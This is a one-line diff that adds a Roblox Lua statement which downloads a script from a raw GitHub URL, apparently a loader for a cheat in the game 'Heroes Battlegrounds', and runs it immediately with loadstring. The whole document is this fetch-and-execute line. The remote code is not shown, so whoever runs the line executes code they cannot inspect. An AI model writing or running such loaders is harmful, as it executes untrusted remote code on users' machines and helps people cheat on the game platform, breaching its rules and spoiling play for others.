@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/heroes-battlegrounds-spam7-sruwyutgo43erl.lua"))()
